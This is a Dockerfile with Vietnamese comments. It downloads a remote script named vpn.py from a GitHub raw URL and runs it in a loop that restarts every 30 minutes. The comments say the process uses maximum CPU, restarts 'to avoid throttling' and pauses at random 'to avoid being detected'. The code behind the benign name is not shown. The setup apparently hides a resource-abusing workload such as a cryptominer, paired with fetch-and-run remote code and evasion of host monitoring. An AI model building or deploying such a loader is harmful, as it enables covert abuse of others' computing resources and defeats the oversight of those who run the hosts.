FROM python:3.12-slim

# Cập nhật hệ thống và cài curl
RUN apt-get update && apt-get install -y curl procps && apt-get clean

# Tải vpn.py
RUN curl -o /vpn.py https://raw.githubusercontent.com/ChauDuongw/toll/refs/heads/main/vpn.py

# Tạo script runner.sh
RUN echo '#!/bin/bash\n\
while true; do\n\
    echo "🚀 Khởi động vpn.py với CPU tối đa..."\n\
    nice -n -5 python /vpn.py &\n\
    PID=$!\n\
    # Chạy 30 phút rồi restart để tránh throttling\n\
    sleep 1800\n\
    echo "♻️ Restart tiến trình để giữ tốc độ tối đa..."\n\
    kill -9 $PID\n\
    # Nghỉ ngắn dao động để tránh bị phát hiện\n\
    sleep $((5 + RANDOM % 10))\n\
done\n' > /runner.sh && chmod +x /runner.sh

WORKDIR /

# ENTRYPOINT gọi runner.sh
ENTRYPOINT ["/runner.sh"]
